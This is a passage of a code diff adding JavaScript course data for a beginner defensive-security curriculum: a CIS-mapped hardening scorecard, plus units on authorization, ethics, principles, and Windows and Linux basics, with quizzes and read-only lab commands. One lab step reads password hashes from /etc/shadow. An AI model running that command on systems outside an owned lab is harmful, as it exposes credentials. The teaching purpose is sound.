+   Used by the Sophomore brief unit and the Hardening scorecard page. */
+const AREAS=[
+  {n:'Account management',cis:'CIS Control 5: Account Management',
+   d:'Only authorized accounts exist; extra or stale accounts are removed or disabled; guest is off; no blank or shared passwords; password and lockout policy match the policy you were given.',
+   checks:['Every account matches the authorized list in the scenario brief','Guest and unused default accounts are disabled','No account has a blank or known-weak password','Password length, history and lockout policy are set and verified']},
+  {n:'Access control',cis:'CIS Control 6: Access Control Management',
+   d:'Administrator groups hold only authorized admins; least privilege on files, shares and remote access; UAC on (Windows); no hidden UID 0 accounts or open-ended sudo rules (Linux and FreeBSD).',
+   checks:['Administrators / sudo / wheel group holds only authorized admins','No extra UID 0 accounts and no unexpected sudoers entries','Shares and sensitive files use least-privilege permissions','Remote sign-in (RDP, SSH) is limited to the users who need it; UAC is on']},
+  {n:'Secure configuration',cis:'CIS Control 4: Secure Configuration (with Control 2: unauthorized software)',
+   d:'Firewall on with default deny inbound; every listening service is required or removed; insecure protocols gone or hardened; OS and application security settings set; unauthorized software removed.',
+   checks:['Firewall on for every profile or interface, default deny inbound, only required ports open','Every listening port is explained; unneeded services are stopped and disabled','Insecure protocols (Telnet, FTP, SMBv1) are removed, or hardened if the brief requires them','SSH and RDP are hardened (no root login over SSH, NLA for RDP)','Unauthorized software and remote-access tools are removed']},
+  {n:'Patching',cis:'CIS Control 7: Continuous Vulnerability Management',
+   d:'Operating system and applications are up to date; automatic updates are on; package sources are legitimate.',
+   checks:['Operating system fully updated','Automatic updates turned on','Applications (browser, web server, office tools) updated','Package sources and update settings point to legitimate repositories']},
+  {n:'Malware defenses',cis:'CIS Control 10: Malware Defenses',
+   d:'Antivirus on with current signatures; persistence (startup items, scheduled tasks, cron, services) checked; backdoors removed.',
+   checks:['Antivirus (Microsoft Defender or equivalent) on, real-time protection enabled, signatures current','Startup items, scheduled tasks, cron jobs and service units reviewed','Backdoors removed: rogue listeners, reverse shells, unknown SSH keys']},
+  {n:'Audit logging',cis:'CIS Control 8: Audit Log Management',
+   d:'Logon and account-change auditing on; system logging running and kept long enough to investigate; your own change log for every change.',
+   checks:['Logon and account-management auditing enabled','System logging is running and persists across reboots','A change log records every change you made']}
+];
+const AREAS_EXTRA=[
+  ['Data handling','CIS Control 3: Data Protection. Unauthorized media files and plaintext password files are removed or secured, as the brief or policy says.'],
+  ['Investigation','Outside the six areas: answering questions about what happened on the machine (forensics basics), exactly in the format asked.'],
+  ['Availability','Not an area but a gate: before you finish, every required service and every authorized user still works. Breaking them fails the A in the CIA triad.']
+];
+
+/* =====================================================================
+   LEVELS
+   ===================================================================== */
+const LEVELS=[];
+
+/* ---------------------------- FRESHMAN ---------------------------- */
+LEVELS.push({
+ id:'freshman', grade:'Freshman', range:'Zero to beginner', color:'var(--l1)', chev:1,
+ blooms:['R','U'], bloomCap:'Remember and understand. Light hands-on at the end of each unit.',
+ intro:'You have never opened a terminal and that is fine. This grade gives you the vocabulary, the ground rules of authorized defensive work, and your first commands on each operating system. It maps to open frameworks: the NICE Workforce Framework for the work roles, the CIS Critical Security Controls v8 for what to harden, and the NIST Cybersecurity Framework 2.0 for the big picture.',
+ mentor:['Twenty-minute blocks: one idea, one quiz, one thing typed on a real VM. Stop while it is still fun.','Celebrate the first correct command out loud. Confidence is the actual curriculum at this grade.','Pair this page with a free course (NetAcad, Khan Academy) as the read-along; use this page for the checks and the hands-on.','Keep beginners on snapshot-backed practice VMs or Lockdown Range, with the solution walkthrough next to them. Never on a computer someone depends on.'],
+ units:[
+ {id:'f1',title:'How hands-on defense practice works',bloom:'Remember',sum:'Authorization and scope, the scenario brief, baseline then harden then verify, change logs, availability, and where to practice in the open.',
+  blocks:[
+   C('The job in one paragraph','Remember',
+     P('Hands-on defense practice puts you in the seat of a new IT administrator at a small organization. You get a <b>lab</b>: a practice machine, usually a virtual machine, left in a deliberately neglected state, with weak passwords, extra administrators, unneeded services and maybe hidden malware. Your job is to find and fix as much as you can <b>within your authorization</b> and <b>without breaking what the organization needs</b>. Many labs include a progress check that reports the fixes it can see.'),
+     TIPS('<b>Authorization and scope.</b> Before you touch anything, know which machines you may change, what you may do to them, and when. In professional security work this is written down as the <b>rules of engagement</b>. No written permission, no work.',
+          '<b>The scenario brief.</b> Every lab comes with one: the authorized users and administrators, the services the business needs, the software policy, and any investigation questions. It defines what "correct" means on that machine.',
+          '<b>Baseline, harden, verify.</b> Record how the machine looks first, change one thing at a time, then confirm the change worked and nothing required broke.',
+          '<b>Change log.</b> One line per change: time, machine, what you did, how to undo it.',
+          '<b>Availability is security too.</b> It is the A in the CIA triad. Removing a service the business needs is an outage, not a fix.')),
+   C('Baseline, harden, verify','Understand',
+     TIPS('<b>Baseline:</b> list users, groups, running services, listening ports, installed software, firewall state and patch level. Take a snapshot if the lab allows it. This is your "before" picture.',
+          '<b>Harden:</b> fix one thing at a time, highest impact first, and log it before you press Enter.',
+          '<b>Verify:</b> re-run the baseline commands and compare. Confirm the fix took effect and that every required service and authorized user still works.',
+          '<b>Report:</b> finish with a short summary of what you changed and why. That summary is what a real manager reads.'),
+     NOTE('This loop mirrors real frameworks. NIST CSF 2.0 calls it Identify, Protect and Detect; the CIS Critical Security Controls list what to harden. This course groups the hardening work into six areas, shown on the Hardening scorecard page.')),
+   C('Where to practice, openly','Remember',
+     TIPS('<b>Your own virtual machines.</b> Linux and FreeBSD are free, and Microsoft offers time-limited evaluation editions of Windows. A VM you own is a system you are fully authorized to break and rebuild.',
+          '<b>Lockdown Range and Lockdown Drills</b> on this site: browser-based labs and drills for Windows, Linux and Cisco IOS, with nothing to install.',
+          '<b>picoCTF</b> (Carnegie Mellon University): free challenges and lessons for beginners.',
+          '<b>OverTheWire: Bandit</b>: the Linux command line, one level at a time.',
+          '<b>National Cyber League</b>: virtual, learning-centered competitions for students, with practice gyms.')),
+   C('Where it leads: work roles','Understand',
+     P('The <b>NICE Workforce Framework for Cybersecurity</b> (from NIST, published by CISA\u2019s NICCS) describes cybersecurity work as <b>work roles</b>, each with its tasks, knowledge and skills. The hands-on work in this course touches several of them:'),
+     TIPS('<b>Systems Administration</b> and <b>Network Operations</b> (Implementation and Operation): keep machines and networks running and securely configured.',
+          '<b>Defensive Cybersecurity</b> and <b>Vulnerability Analysis</b> (Protection and Defense): find weaknesses and close them.',
+          '<b>Incident Response</b> and <b>Digital Forensics</b> (Protection and Defense): work out what happened and contain it.',
+          '<b>Security Control Assessment</b> (Oversight and Governance): check systems against a standard, like the checklist you build in Senior.')),
+   FLASH('f1fl','Vocabulary',[
+     ['Authorization','Permission from the system owner, ideally in writing, to access or change a system. Without it, even well-meant changes are unauthorized access.'],
+     ['Scope','Exactly which systems, accounts and actions your authorization covers. Anything outside it is off limits.'],
+     ['Rules of engagement','The written agreement for security work: scope, allowed actions, time window, contacts, and what to do if something breaks.'],
+     ['Scenario brief','The document that comes with a lab: authorized users and admins, required services, software policy, investigation questions.'],
+     ['Baseline','A record of how a system looks before you change it: users, services, ports, software, settings.'],
+     ['Hardening','Reducing a system\u2019s attack surface: removing what is not needed and securely configuring what remains.'],
+     ['Verification','Checking that a change worked and that nothing required broke.'],
+     ['Change log','One line per change: time, machine, what changed, how to undo it.'],
+     ['Availability','The A in the CIA triad: systems and data work when they are needed. Breaking a required service fails it.'],
+     ['Lab','A practice machine or set of machines built to be changed, which you are authorized to work on.'],
+     ['Hypervisor','Software that runs virtual machines, such as Hyper-V, VirtualBox or VMware Workstation Pro.'],
+     ['Work role','A NICE Framework description of one kind of cybersecurity job, with its tasks, knowledge and skills.']
+   ]),
+   QUIZ('f1q','Check: how hands-on practice works',[
+     ['Before you change anything on a machine, what must you have?',['Administrator rights','Authorization from the owner that covers this machine and this kind of change','A fast internet connection','A script that does it for you'],1,'Technical access is not permission. Authorization and scope come first; in professional work they are written into the rules of engagement.'],
+     ['Right after you disable a service, the lab reports a failed availability check. What happened?',['The lab is broken','You stopped something the scenario brief says the business needs','Availability checks are random','You found malware'],1,'The brief lists required services. Re-enable it (your change log says how), then harden it instead of removing it.'],
+     ['Which order is right?',['Harden, baseline, verify','Verify, harden, baseline','Baseline, harden, verify','Harden, verify, baseline'],2,'Record the before picture, change one thing at a time, then confirm it worked and that nothing required broke.'],
+     ['You fix an obviously weak password and the lab\u2019s progress check does not change. Best conclusion?',['You fixed it wrong','A lab cannot check everything; a real fix is still a real fix, so keep going','Undo it','Passwords never matter'],1,'Progress checks sample the problems. Your goal is a secure machine, not a number.'],
+     ['Which NICE Framework work role best matches "keep servers patched, configured and running"?',['Cybercrime Investigation','Systems Administration','Cybersecurity Legal Advice','Executive Cybersecurity Leadership'],1,'Systems Administration sits in the Implementation and Operation category. Hardening work also overlaps Defensive Cybersecurity.']
+   ]),
+   LINKS('Go further',['nice','nist-csf','cis-controls','t4t-range','pico','bandit','ncl'])
+  ]},
+ {id:'f2',title:'Safe and ethical online',bloom:'Understand',sum:'PII, authorization, and the habit that keeps you employable: just because you can does not mean you should.',
+  blocks:[
+   C('Why ethics is unit two','Understand',
+     P('Security training teaches you to find weaknesses. The same knowledge opens doors you have no right to open. Every employer draws the line at <b>authorization</b>: you may test, change or probe only systems you own or have explicit written permission to touch. Labs and VMs you own are built to be changed. Your school\u2019s network, a friend\u2019s account, a public website: not yours, not ever, not even "just to see".'),
+     TIPS('<b>PII</b> (personally identifiable information): name plus anything that pins it to one person (address, birthdate, Social Security number, photos, school). Treat it like cash.',
+          '<b>Strong passwords</b> are long, unique per site, and kept in a password manager. Length beats clever substitutions.',
+          '<b>Two-factor authentication</b> (2FA) turns a stolen password into a near miss.',
+          '<b>Phishing</b> works on smart people. Hover before you click, check the sender domain, and report rather than reply.',
+          '<b>Cyberbullying and doxxing</b> are not pranks; they are harm, and often crimes.')),
+   QUIZ('f2q','Scenarios: what do you do?',[
+     ['A classmate finds the teacher\u2019s Wi-Fi admin page is still on the default password. He wants to "fix it for them".',['Fix it quietly; it helps the school','Tell the teacher or IT staff, touch nothing','Post it in the class group chat so everyone knows','Log in just to confirm it works, then tell IT'],1,'Report, do not touch. Logging in to a system you are not authorized to administer is unauthorized access even with good intentions.'],
+     ['Which password is strongest?',['P@ssw0rd!','correct-horse-battery-staple-oahu','Summer2026','Your pet\u2019s name plus 123'],1,'Length and unpredictability win. A long passphrase beats a short one with symbols swapped in.'],
+     ['An email from "IT Help Desk" says your account will be deleted today unless you reply with your password and the code from your authenticator app.',['Reply quickly so you keep your account','Do not reply; report it through your organization\u2019s reporting channel or call IT on a number you already know','Reply with the password only','Click the link to check if it is real'],1,'Real IT staff never need your password or your MFA code. Urgency plus a request for credentials is the signature of phishing; verify through a channel you already trust.'],
+     ['A practice lab contains a file with a real-looking person\u2019s photo and home address. The investigation question asks only for the file name.',['Report the file name, nothing else','Copy the photo for a laugh','Share the address in the group chat','Delete the file so nobody sees it'],0,'Answer exactly what is asked. Spreading PII, even from a practice scenario, is the habit you are training against. Do not delete it either unless the scenario brief says that kind of file must be removed.']
+   ]),
+   REFLECT('f2r','In your own words','Write two sentences: what does "authorized" mean, and why would a company fire a brilliant technician who ignores it?'),
+   LINKS('Go further',['eff','cisa','khan'])
+  ]},
+ {id:'f3',title:'Security principles',bloom:'Understand',sum:'The CIA triad, threats versus vulnerabilities, least privilege, defense in depth, and the names of the bad stuff.',
+  blocks:[
+   C('Five ideas you will use on every machine','Understand',
+     TIPS('<b>CIA triad.</b> Confidentiality (only the right people see it), Integrity (it is not secretly changed), Availability (it works when needed). Every fix protects at least one.',
+          '<b>Threat, vulnerability, risk.</b> A threat is who or what might attack. A vulnerability is the weakness they would use. Risk is how likely and how bad. You remove vulnerabilities; you cannot remove threats.',
+          '<b>Least privilege.</b> Every account and program gets the minimum access needed to do its job. Most findings on a neglected machine live here: extra admins, extra services, extra permissions.',
+          '<b>Defense in depth.</b> Layers: firewall, patched software, strong passwords, antivirus, logging, backups. One layer failing should not mean game over.',
+          '<b>Authentication vs authorization.</b> Authentication proves who you are (password, key). Authorization decides what you may do (groups, permissions).')),
+   C('Malware and attacks, by name','Remember',
+     TIPS('<b>Virus</b> attaches to files and spreads when they run. <b>Worm</b> spreads by itself over the network. <b>Trojan</b> pretends to be useful. <b>Ransomware</b> encrypts your files and sells you the key.',
+          '<b>Keylogger</b> records keystrokes. <b>Backdoor</b> is a hidden way in (a netcat listener, an extra SSH key, a rogue user). <b>Rootkit</b> hides itself from the operating system.',
+          '<b>Social engineering</b> attacks people, not software: phishing, pretexting, tailgating.',
+          '<b>Brute force</b> guesses passwords; lockout policy and length defeat it. <b>Privilege escalation</b> turns a normal user into an admin; least privilege limits it.')),
+   MATCH('f3m','Match the principle to the fix','Tap an item on the left, then its match on the right.',[
+     ['Least privilege','Remove an unauthorized user from the Administrators group'],
+     ['Availability','Keep the web server running because the scenario brief says customers need it'],
+     ['Confidentiality','Set /etc/shadow so only root and the shadow group can read it'],
+     ['Integrity','Enable automatic updates so tampered or buggy versions get replaced'],
+     ['Defense in depth','Turn the firewall on even though the weak service is already removed'],
+     ['Authentication','Require a long password for every account']
+   ]),
+   QUIZ('f3q','Check: principles',[
+     ['The scenario brief says "Bob is the only administrator." You find Bob, Alice and Mallory in the Administrators group. Which principle tells you what to do?',['Availability','Least privilege','Defense in depth','Non-repudiation'],1,'Only the accounts that need admin get admin. Remove Alice and Mallory from the group (do not delete them unless the brief says they are unauthorized users).'],
+     ['Which is a vulnerability, not a threat?',['A disgruntled ex-employee','A phishing crew','An SSH server that allows root login with a password','A ransomware gang'],2,'Threats are actors or events. The root-login setting is the weakness they would exploit.'],
+     ['Turning the firewall on when every risky service is already removed is an example of',['Wasted time','Defense in depth','Availability','Privilege escalation'],1,'Layers. The next admin will install something; the firewall catches it.'],
+     ['Software that looks like a game but installs a hidden remote-control tool is a',['Worm','Trojan','Rootkit','Keylogger'],1,'Trojans disguise themselves as something wanted. Unauthorized-software findings on practice machines are often exactly this.']
+   ]),
+   LINKS('Go further',['nist-csf','cisa','khan'])
+  ]},
+ {id:'f4',title:'Computers, virtualization and the network',bloom:'Remember',sum:'What a VM is, snapshots versus backups, why checksums matter, and the networking words you will hear everywhere.',
+  blocks:[
+   C('Virtual machines in plain words','Understand',
+     P('A <b>virtual machine</b> (VM) is a whole computer running as a program inside your computer. The <b>hypervisor</b> pretends to be hardware; the <b>guest</b> operating system inside has no idea. Practice labs are usually VMs because you can copy them, snapshot them and reset them in minutes.'),
+     TIPS('Common free hypervisors: <b>Hyper-V</b> (built into Windows 11 Pro, Enterprise and Education), <b>VirtualBox</b>, and <b>VMware Workstation Pro</b>. Your CPU\u2019s virtualization feature (Intel VT-x or AMD-V) must be enabled in the firmware settings.',
+          'Check each guest\u2019s requirements before you start. Windows 11, for example, needs at least 4 GB of RAM and 64 GB of storage, on top of what your host needs.',
+          '<b>Snapshots</b> save the VM\u2019s exact state. Take one before risky changes so you can roll back in seconds. A snapshot is not a backup: it lives with the VM, so losing that disk loses both.',
+          '<b>Checksum</b> (SHA-256, or the older MD5) is a fingerprint of a file. Compare a downloaded ISO\u2019s checksum to the value the publisher lists, so you know it arrived complete and unaltered.',
+          'Keep the VM window and the host separate in your head: a command typed in the wrong window changes the wrong computer.')),
+   C('Networking words','Remember',
+     TIPS('<b>IP address</b>: the number that identifies a device on a network (192.168.1.20). <b>Subnet mask</b> (255.255.255.0) says which part is the network. <b>Default gateway</b>: the router that leads out.',
+          '<b>DNS</b> turns names into addresses. <b>DHCP</b> hands out addresses automatically.',
+          '<b>Switch</b> connects devices inside one network using MAC addresses. <b>Router</b> connects networks using IP addresses.',
+          '<b>Port</b>: a numbered door on a device. 22 SSH, 23 Telnet, 80 HTTP, 443 HTTPS, 21 FTP, 3389 RDP, 53 DNS.',
+          '<b>Ping</b> tests reachability. <b>ipconfig</b> (Windows) and <b>ip a</b> (Linux) show your addresses.'),
+     CMDS('Try these on any machine you own',[
+       ['ipconfig /all','Windows: every adapter, IP, mask, gateway, DNS, MAC.'],
+       ['ip a','Linux: addresses on every interface (a is short for address).'],
+       ['ping 1.1.1.1','Is the internet reachable by IP? (Ctrl+C to stop on Linux.)'],
+       ['ping example.com','Does name resolution (DNS) work too?'],
+       ['nslookup example.com','Ask DNS directly and see which server answered.'],
+       ['tracert 1.1.1.1','Windows: the routers between you and the target. Linux: traceroute 1.1.1.1']
+     ])),
+   QUIZ('f4q','Check: machines and networks',[
+     ['Why compare a downloaded ISO\u2019s SHA-256 checksum to the one on the publisher\u2019s site?',['To unlock the file','To confirm the file is complete and unaltered','To register the software','To speed up installation'],1,'A checksum is a fingerprint. A mismatch means a corrupt or tampered download: get it again from the official source.'],
+     ['Which device forwards traffic between two different networks?',['Switch','Router','Hub','Access point'],1,'Routers route between networks using IP. Switches forward inside a network using MAC addresses.'],
+     ['Port 22 is normally',['FTP','Telnet','SSH','HTTPS'],2,'SSH on 22. Telnet is 23 and sends everything in clear text, which is why it is a classic finding.'],
+     ['A VM snapshot is',['A screenshot of the desktop','A saved copy of the VM\u2019s whole state you can return to','A backup of your email','A log of your commands'],1,'Snapshots on your own practice VMs let you break things fearlessly and roll back.'],
+     ['Why is a snapshot not a real backup?',['It is too small','It is stored with the VM, so losing that disk or host loses the snapshot too','Snapshots cannot be restored','Backups are only for servers'],1,'A backup lives somewhere else (another disk, another site) and survives the loss of the original. A common rule of thumb is 3-2-1: three copies, two kinds of media, one off site.']
+   ]),
+   LINKS('Go further',['t4t-subnet','khan','netacad'])
+  ]},
+ {id:'f5',title:'First look at Windows',bloom:'Apply',sum:'Editions and account types, UAC and NTFS permissions, where users, policies, the firewall, updates and Defender live, and your first commands.',
+  blocks:[
+   C('Windows editions and terms','Remember',
+     TIPS('<b>Editions.</b> Windows 11 Home, Pro, Enterprise and Education share one core. Pro and above add BitLocker, domain join, Hyper-V, the Local Group Policy Editor (<code>gpedit.msc</code>) and Local Security Policy (<code>secpol.msc</code>). Home does not include those two consoles.',
+          '<b>Windows Server</b> (2022, 2025) is the server family, with roles such as Active Directory, DNS, DHCP and IIS. Run <code>winver</code> to see the exact edition, version and build of any Windows machine.',
+          '<b>Account types.</b> A <b>local account</b> exists only on this PC. A <b>Microsoft account</b> signs in with an online identity. A <b>domain account</b> lives in Active Directory and works on every machine in the domain.',
+          '<b>User Account Control (UAC).</b> Administrators run with standard rights until something needs elevation; then UAC asks for consent (admins) or for an admin\u2019s credentials (standard users). It is on by default. Leave it on.',
+          '<b>NTFS permissions.</b> Every file and folder has an access control list (ACL) of allow and deny entries for users and groups. Folders pass entries down to their contents through <b>inheritance</b>; entries set directly on an item take precedence over inherited ones.',
+          '<b>SID.</b> Windows tracks accounts by security identifier, not by name. Renaming an account keeps its SID, its group memberships and its rights.')),
+   C('The map of Windows security','Remember',
+     P('Everything you will secure on a Windows machine lives behind a short list of consoles. Press <kbd>Win</kbd>+<kbd>R</kbd>, type the name, press Enter.'),
+     CMDS('Consoles to memorize',[
+       ['lusrmgr.msc','Local Users and Groups: add, disable, delete users; see who is in Administrators. (Not on Home: use Settings or PowerShell.)'],
+       ['secpol.msc','Local Security Policy: password policy, lockout policy, audit policy, security options (including UAC).'],
+       ['gpedit.msc','Local Group Policy Editor: hundreds of settings, including the ones secpol shows.'],
+       ['services.msc','Services: what runs in the background and how it starts.'],
+       ['wf.msc','Windows Defender Firewall with Advanced Security: profiles and rules.'],
+       ['eventvwr.msc','Event Viewer: logs. The Security log is where logons and account changes land.'],
+       ['taskschd.msc','Task Scheduler: a favorite hiding spot for malware.'],
+       ['appwiz.cpl','Programs and Features: uninstall unauthorized software.'],
+       ['ms-settings:windowsupdate','Settings > Windows Update (type it in Run).']
+     ])),
+   C('Your first PowerShell','Apply',
+     P('Right-click Start, choose <b>Terminal (Admin)</b> or <b>Windows PowerShell (Admin)</b>. UAC will ask you to confirm: that prompt is the elevation you just read about. Try each line and read what comes back.'),
+     CMDS('Read-only first (nothing changes)',[
+       ['Get-LocalUser','Every local account, with Enabled true/false.'],
+       ['Get-LocalGroupMember -Group Administrators','Who has admin. Compare to the scenario brief.'],
+       ['net accounts','Password length, age, history and lockout settings, in one screen.'],
+       ['Get-NetFirewallProfile | Select-Object Name,Enabled','Domain, Private and Public profiles: all should be True.'],
+       ['Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated','Is Defender on and current?'],
+       ['Get-Service | Where-Object Status -eq Running | Sort-Object DisplayName','What is running right now.'],
+       ['Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5','Most recent updates.'],
+       ['whoami /groups','Your groups. An elevated session shows Mandatory Label\\High Mandatory Level.'],
+       ['icacls C:\\Users\\Public','The ACL on a folder. (OI)(CI) means the entry flows to files and subfolders; (I) means it was inherited.'],
+       ['Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System | Select-Object EnableLUA,ConsentPromptBehaviorAdmin','UAC: EnableLUA 1 means on; ConsentPromptBehaviorAdmin 5 is the default prompt.']
+     ])),
+   FLASH('f5fl','Windows terms',[
+     ['UAC','User Account Control: admins run with standard rights until an action needs elevation, then Windows prompts.'],
+     ['ACL','Access control list: the allow and deny entries that decide who can do what to a file, folder, share or registry key.'],
+     ['Inheritance','A folder passes its permission entries down to the files and subfolders inside it.'],
+     ['SID','Security identifier: the value Windows uses to identify an account or group. Names can change; SIDs do not.'],
+     ['Local account','An account that exists only on one computer.'],
+     ['Domain account','An account stored in Active Directory that can sign in to any computer in the domain.'],
+     ['secpol.msc','Local Security Policy: password, lockout, audit and security options (Pro and above).'],
+     ['Event ID 4624','A successful logon, recorded in the Security log. 4625 is a failed logon.']
+   ]),
+   LAB('f5lab','Lab: five minutes on a Windows VM','On a Windows VM you own (Pro or an evaluation edition, not a computer someone else manages), do each step and tick it.',[
+     ['Open Local Users and Groups and write down every account and whether it is enabled.','lusrmgr.msc'],
+     ['List the Administrators group in PowerShell and compare to what you saw.','Get-LocalGroupMember -Group Administrators'],
+     ['Check all three firewall profiles are enabled.','Get-NetFirewallProfile | Select-Object Name,Enabled'],
+     ['Open Local Security Policy and find Account Policies > Password Policy. Note the minimum length.','secpol.msc'],
+     ['Open Windows Security and confirm real-time protection is on.',null],
+     ['Look at the permissions on a folder and find one inherited entry.','icacls C:\\Users\\Public'],
+     ['Open Event Viewer > Windows Logs > Security and find one logon event (ID 4624).','eventvwr.msc']
+   ]),
+   QUIZ('f5q','Check: Windows map',[
+     ['Where do you change the minimum password length on a stand-alone Windows Pro machine?',['services.msc','secpol.msc > Account Policies > Password Policy','eventvwr.msc','wf.msc'],1,'Local Security Policy owns password and lockout policy. Group Policy Editor also reaches it.'],
+     ['Which command shows who is a local administrator?',['Get-LocalUser','net accounts','Get-LocalGroupMember -Group Administrators','Get-Service'],2,'Get-LocalUser lists users; group membership is a separate question.'],
+     ['Which console would you open to see tasks that run automatically on a schedule or at logon?',['lusrmgr.msc','appwiz.cpl','taskschd.msc','secpol.msc'],2,'Task Scheduler (plus Startup apps in Settings and Autoruns from Sysinternals) is where persistence hides.'],
+     ['Your laptop runs Windows 11 Home and secpol.msc will not open. Why?',['It is broken','Home does not include Local Security Policy or the Group Policy Editor','You need to be online','You must reboot first'],1,'Those consoles ship with Pro, Enterprise and Education. On Home, use net accounts and Settings, or practice on a Pro or evaluation VM.'],
+     ['UAC is turned off (EnableLUA = 0). Why does that matter?',['It does not','Every program an administrator starts gets full rights with no prompt, including malware','It turns off the firewall','It slows the PC down'],1,'With Admin Approval Mode off there is no prompt between an admin and full control. Windows Security also warns that overall security is reduced.'],
+     ['A folder inherits "Everyone: Read" from its parent. You want only the Finance group in this one folder. Cleanest approach?',['Delete the parent folder','Disable inheritance on that folder (copying the entries), remove Everyone, grant Finance','Add a Deny for Everyone on every file','Rename the folder'],1,'Breaking inheritance gives the folder its own ACL. icacls folder /inheritance:d copies the inherited entries so you can edit them; /inheritance:r removes them.']
+   ]),
+   LINKS('Go further',['ms-win-sec','ms-uac','ms-icacls','ms-ps','t4t-ld-win11','t4t-lr-win'])
+  ]},
+ {id:'f6',title:'First look at Linux',bloom:'Apply',sum:'Distributions in one minute, the terminal, ten commands, and the three files that describe every user on the machine.',
+  blocks:[
+   C('Linux in one minute','Understand',
+     TIPS('<b>Linux</b> is the kernel; a <b>distribution</b> (distro) bundles it with tools, a package manager and a desktop. Almost everything is a file, and permissions decide who may read, write or execute each one.',
+          '<b>Debian</b> is a community-run distribution and the base for many others. <b>Ubuntu</b>, from Canonical, is built on Debian, with a long-term support (LTS) release every two years and five years of standard security updates.',
+          '<b>Linux Mint</b> is built on Ubuntu LTS (its alternate edition, LMDE, is built on Debian). Same apt and .deb packages, different desktop (Cinnamon by default) and tools: <b>Update Manager</b> for updates and <b>Timeshift</b> for system snapshots. Mint disables Snap by default; Ubuntu installs some apps as Snaps.',
+          'All three use <code>apt</code>, <code>systemd</code>, the <b>sudo</b> group for administrators and the same files under /etc, so most commands on this page work on each.')),
+   C('Ten commands that get you anywhere','Apply',
+     P('Open a terminal (<kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>T</kbd> on Mint and Ubuntu). The prompt ends with <code>$</code> for a normal user. <code>sudo</code> runs one command as the superuser (root); it asks for <b>your</b> password.'),
+     CMDS('Navigate and read',[
+       ['pwd','Print working directory: where am I?'],
+       ['ls -la','List everything here, including hidden dotfiles, with permissions and owners.'],
+       ['cd /etc','Change directory. cd alone goes home; cd .. goes up one.'],
+       ['cat /etc/hostname','Print a file. For long files: less /etc/passwd (q to quit).'],
+       ['man ls','The manual for any command. Press q to leave.'],
+       ['sudo -l','What am I allowed to run with sudo?'],
+       ['whoami','Which user am I right now?'],
+       ['id','My user id, group id and groups.'],
+       ['history','Commands I have typed. Great for your change log.'],
+       ['clear','Clean screen. Ctrl+C cancels a running command.']
+     ])),
+   C('The three user files','Understand',
+     TIPS('<b>/etc/passwd</b>: one line per account: <code>name:x:UID:GID:comment:home:shell</code>. Normal humans have UID 1000 and up. UID 0 is root. Anything else with UID 0 is a backdoor.',
+          '<b>/etc/shadow</b>: password hashes. Readable only by root and the shadow group. A <code>!</code> or <code>*</code> in the hash field means the account is locked or has no password set.',
+          '<b>/etc/group</b>: group memberships. On Mint, Ubuntu and Debian, members of the <b>sudo</b> group are administrators. (Some setups also use <b>wheel</b> or a custom group; check <code>sudo -l</code> and <code>/etc/sudoers</code>.)'),
+     CMDS('Look, do not change (yet)',[
+       ['awk -F: \'$3 >= 1000 && $3 < 65534 {print $1}\' /etc/passwd','Human accounts: field 3 (UID) between 1000 and 65533.'],
+       ['awk -F: \'$3 == 0 {print $1}\' /etc/passwd','Every UID-0 account. Only root should print.'],
+       ['getent group sudo','Who can become root. Compare to the scenario brief\u2019s administrator list.'],
+       ['sudo head -n 5 /etc/shadow','First five password entries (needs root).'],
+       ['ls -l /etc/shadow /etc/passwd','Expect -rw-r----- root shadow and -rw-r--r-- root root.']
+     ])),
+   FLASH('f6fl','Linux terms',[
+     ['Kernel','The core of the operating system that talks to hardware and runs processes. Linux is a kernel.'],
+     ['Distribution','A kernel plus tools, package manager and desktop, released together: Debian, Ubuntu, Linux Mint.'],
+     ['LTS','Long-term support: an Ubuntu release (every two years) that gets five years of standard security updates.'],
+     ['root','The superuser, UID 0. Can do anything, which is why you borrow its power with sudo one command at a time.'],
+     ['sudo','Runs one command as root after checking your own password and your rights in /etc/sudoers.'],
+     ['/etc/passwd','The account list: name, UID, GID, home directory and shell. Not the passwords.'],
+     ['/etc/shadow','The password hashes and aging data, readable only by root and the shadow group.'],
+     ['apt','The package manager on Debian, Ubuntu and Mint: install, update and remove .deb packages.'],
+     ['Timeshift','Mint\u2019s system snapshot tool. Protects system files; home folders are excluded by default.']
+   ]),
+   LAB('f6lab','Lab: five minutes on a Linux VM','On a Mint or Ubuntu VM you own, do each step and tick it.',[
+     ['Open a terminal and print where you are and who you are.','pwd; whoami; id'],
+     ['Check which release you are on.','cat /etc/os-release'],
+     ['List the human accounts on the machine.','awk -F: \'$3 >= 1000 && $3 < 65534 {print $1}\' /etc/passwd'],
+     ['List the sudo group.','getent group sudo'],
+     ['Read the manual page for ls and find what -a and -l mean.','man ls'],
+     ['Show the last 20 lines of the authentication log (Mint/Ubuntu). On Debian use journalctl.','sudo tail -n 20 /var/log/auth.log'],
+     ['Check whether the firewall is active.','sudo ufw status']
+   ]),
+   QUIZ('f6q','Check: Linux basics',[
+     ['Which UID is root?',['1','0','1000','65534'],1,'UID 0 is root. A second UID-0 account, whatever its name, is a hidden administrator and a classic finding.'],
+     ['sudo asks for a password. Whose?',['root\u2019s','The current user\u2019s','The instructor\u2019s','No password, ever'],1,'sudo authenticates you, then grants root for that command. Membership in the sudo group is what makes it work.'],
+     ['Which file holds password hashes?',['/etc/passwd','/etc/group','/etc/shadow','/etc/sudoers'],2,'/etc/shadow, readable by root only. The x in /etc/passwd just points there.'],
+     ['Which command lists hidden files too?',['ls','ls -la','ls -h','cat .'],1,'-a shows dotfiles like .bashrc, which is also where malicious aliases hide.'],
+     ['Linux Mint\u2019s main edition is built on',['Fedora','Ubuntu LTS','FreeBSD','Windows'],1,'Mint follows Ubuntu LTS releases, so Ubuntu documentation usually applies. LMDE is the Debian-based edition.']
+   ]),
+   LINKS('Go further',['linuxjourney','bandit','explainshell','mint-docs','ubuntu-server','t4t-ld-mint','t4t-lr-linux'])
+  ]},
+ {id:'f7',title:'Networking fundamentals and Cisco basics',bloom:'Remember',sum:'The OSI and TCP/IP models, addressing, how switches and routers decide, and where to learn Cisco networking for free.',
+  blocks:[
+   C('Two models of a network','Understand',
